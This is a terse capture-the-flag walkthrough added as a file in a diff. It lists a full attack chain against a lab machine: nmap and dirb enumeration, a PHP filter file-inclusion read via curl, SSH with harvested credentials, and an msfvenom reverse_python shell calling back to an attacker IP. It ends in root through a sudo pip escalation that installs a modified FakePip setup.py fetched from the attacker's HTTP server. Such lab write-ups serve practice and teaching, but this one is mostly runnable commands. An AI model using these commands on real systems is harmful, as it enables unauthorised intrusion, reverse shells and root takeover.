@@ -1,0 +1,57 @@
+Locate a network ip of machine
+Scanning by NMap
+Locate Apache and site on this server
+dirb a site
+locate source code, and commented line
+convert to base64 by curl
+
+curl http://192.168.1.124/?lang=php://filter/convert.base64-encode/resource=index
+
+decode base64 to visible format
+find a password
+connect by shh using user and password
+we`ve geting to python shell
+and spawn a user shell by
+
+import pty
+pty.spawn("/bin/bash")
+
+locate first flag
+searching a devops user
+searching a vulnerable file
+make a payload by msfvenom and put that to python file
+
+msfvenom -p cmd/unix/reverse_python lhost=192.168.1.134 lport=4444 R
+nc -lvp 4444
+
+rerun the machine
+locate a 2nd flag
+searching a vuln file in devops
+
+sudo -l
+
+(PIP vuln)
+
+using fake pip, hack the root
+
+https://github.com/0x00-0x00/FakePip
+git clone https://github.com/0x00-0x00/FakePip.git
+
+decode a base64 from os.system call remove a default ip change this to our ip
+change os.system call, with our new base64 code
+load a Simple Http server by python
+
+python -m SimpleHTTPServer 80
+
+download and reinstall a fake pip
+
+wget http://192.168.1.134/setup.py
+sudo pip install . --upgrade --force-reinstall
+
+one more time listen to connectionby 
+
+nc -lvp 443
+
+locate a root flag
+DONE!!!
+
